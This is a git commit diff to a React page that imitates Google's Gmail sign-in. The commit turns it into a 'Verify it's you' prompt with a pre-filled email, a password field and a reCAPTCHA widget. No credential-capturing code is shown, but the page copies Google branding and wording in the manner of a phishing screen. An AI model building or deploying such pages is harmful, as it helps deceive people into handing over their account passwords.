9948d2c5cd64981dc0be132893f8ffd22c1521be
muhammadjamiu abdulganiyu <ganiujamiu03@gmail.com>
2024-02-19 22:32:52 +0100

    file

--- src/pages/google.jsx
+++ src/pages/google.jsx
@@ -1,4 +1,5 @@
 import React from 'react'
+import ReCAPTCHA from 'react-google-recaptcha';
 
 export default function Google() {
   return (
@@ -13,20 +14,26 @@ export default function Google() {
                     <span className='text-success'>l</span>
                     <span className='text-danger'>e</span>
                 </h4>
-                <h5 className="name">Sign in</h5>
-                <p className="">to continue to Gmail</p>
+                <h5 className="name">Verify it’s you</h5>
+                <p className="mb-2">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
+                <p className="email btn  dropdown-toggle"><i class="fa-solid fa-user"></i> test@gmail.com</p>
             </div>
 
-            <div className="inputs mb-5 mt-5">
-                <input type="text" placeholder='Email or Phone' />
+            <div className="inputs mb-2 mt-5">
+                <input type="text" placeholder='Enter your password' />
                 <p className="blue mt-2">Forgot email?</p>
             </div>
+            
 
-            <p className="mb-1 tiny">Not your computer? Use Guest mode to sign in privately.</p>
+            <ReCAPTCHA
+            sitekey="6Le2tponAAAAAB9qS1OXf_MsvRid6auzOi2n3Xy5"
+            />
+
+            <p className="mb-1 mt-5 tiny">Not your computer? Use Guest mode to sign in privately.</p>
             <p className="blue">Learn more about using Guest mode</p>
 
             <div className="d-flex submit mt-5 justify-content-between">
-                <p className="create blue">Create account</p>
+                <p className="create blue">Forgot password?</p>
                 <button className="btn">Next</button>
             </div>
         </div>
